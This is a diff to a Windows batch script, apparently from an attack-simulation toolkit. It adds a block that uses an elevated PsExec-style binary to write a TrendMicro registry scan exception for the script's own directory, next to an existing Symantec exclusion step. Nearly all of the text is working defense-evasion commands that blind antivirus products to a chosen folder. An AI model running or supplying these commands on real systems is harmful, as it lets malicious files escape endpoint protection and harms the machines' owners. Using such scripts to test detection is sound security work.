@@ -41,3 +41,13 @@ ping -n 3 127.0.0.1 > NUL
 "%APTDIR%\p.exe" -accepteula -d -s cmd.exe /c REG ADD "HKLM\\SOFTWARE\Wow6432Node\Symantec\Symantec Endpoint Protection\AV\Exclusions\Domain Controller\NoScanDir" /v %APTDIR% /t REG_DWORD /d 1 /f
 
 ping -n 3 127.0.0.1 > NUL
+
+ECHO ===========================================================================
+ECHO Excluding %APTDIR% for TrendMicro
+:: Reference: http://www.users.on.net/~lynmik/CSTECH/ATF/TrendExclusion.reg
+::            https://twitter.com/0xAbd0/status/967441690821906432
+ping -n 3 127.0.0.1 > NUL
+
+"%APTDIR%\p.exe" -accepteula -d -s cmd.exe /c REG ADD "HKLM\\SOFTWARE\TrendMicro\UniClient\1700\Scan\Exceptions\0" /v %APTDIR% /t REG_DWORD /d 1 /f
+
+ping -n 3 127.0.0.1 > NUL
